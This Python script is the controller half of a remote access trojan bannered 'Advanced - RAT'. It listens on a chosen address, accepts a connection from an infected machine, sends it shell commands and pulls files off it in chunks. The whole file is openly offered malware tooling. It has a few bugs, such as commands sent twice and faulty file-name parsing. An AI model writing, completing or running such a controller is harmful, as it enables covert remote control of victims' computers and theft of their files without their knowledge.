#! /usr/bin/python3

import socket
import pyfiglet
import termcolor

banner = "Advanced - RAT"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

def receive_file():
    print(termcolor.colored("[*] Receiving file...", color="yellow", attrs=["bold"]))

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = input(termcolor.colored("[+] Enter your Ip address: ", color="green", attrs=["bold"]))
    Port = input(termcolor.colored("[+] Select port to listen on: ", color="green", attrs=["bold"]))

    socket_address = (str(IP), int(Port))
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)

    print(termcolor.colored("[*] Listening for incoming connection requests", color="yellow", attrs=["bold"]))
    hacker_socket, client_address = hacker_socket.accept()
    print(termcolor.colored("[+] Connection established with ", color="green", attrs=["bold"]), end="")
    print(termcolor.colored(client_address, color="white", attrs=["bold"]))

    try:
        while True:
            command = input(termcolor.colored("[$] Enter the command : ", color="blue", attrs=["bold"]))
            hacker_socket.send(command.encode())

            if command == "stop":
                hacker_socket.close()
                break

            elif command == "":
                continue

            elif command.startswith("cd"):
                hacker_socket.send(command.encode())
                continue

            elif command.startswith("download"):
                hacker_socket.send(command.encode())
                exist = hacker_socket.recv(1048)

                if exist.decode() == "yes":
                    print(termcolor.colored("[+] File Exists!", color="green", attrs=["bold"]))
                    # receive file here
                    file_name = command.strip("download ")

                    with open(file_name, "wb") as file:
                        print(termcolor.colored("[*] Downloading file", color="yellow", attrs=["bold"]))
                        while True:
                            chunk = hacker_socket.recv(CHUNK_SIZE)

                            if chunk.endswith(eof_identifier.encode()):
                                chunk = chunk[:-len(eof_identifier)]
                                file.write(chunk)
                                break
                            file.write(chunk)

                    print(termcolor.colored("[!] Successfully downloaded, ", color="green", attrs=["bold"]), end="")
                    print(termcolor.colored(file_name, color="white", attrs=["bold"]))

                else:
                    print(termcolor.colored("[!] File doesn't exist", color="red", attrs=["bold"]))
                    continue

            elif command == "screenshot":
                print(termcolor.colored("[*] Taking Screenshot!", color="yellow", attrs=["bold"]))

            else:
                full_command_result = b''

                while True:
                    chunk = hacker_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break

                    full_command_result +=chunk
                print(full_command_result.decode())

    except Exception:
        print(termcolor.colored("[!] Exception occured", color="red", attrs=["bold"]))
        hacker_socket.close()


